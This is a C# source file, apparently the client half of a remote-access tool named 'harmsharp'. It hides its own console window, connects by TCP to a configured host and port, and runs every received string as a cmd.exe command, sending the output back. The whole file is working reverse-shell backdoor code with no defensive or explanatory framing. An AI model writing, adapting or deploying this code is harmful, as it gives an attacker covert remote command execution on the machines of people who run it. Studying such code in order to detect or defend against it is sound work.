using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;


namespace harmsharp
{
    class client
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        static int port = 9999;
        static string address = "127.0.0.1";

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
            try
            {
                IPEndPoint ipPoint = new IPEndPoint(IPAddress.Parse(address), port);

                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                do
                {
                    socket.Connect(ipPoint);
                } while (socket.Poll(1000000, SelectMode.SelectRead));
                    

                byte[] data = new byte[1024];

                while (true)
                {
                    int bytes = socket.Receive(data, data.Length, 0);

                    string Command = Encoding.Unicode.GetString(data, 0, bytes);
                    using Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.Arguments = "/C " + Command;
                    process.Start();

                    StreamReader reader = process.StandardOutput;
                    string output = reader.ReadToEnd();
                    socket.Send(Encoding.Unicode.GetBytes(output));
                }


            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.ReadLine();
            }

        }

    }
}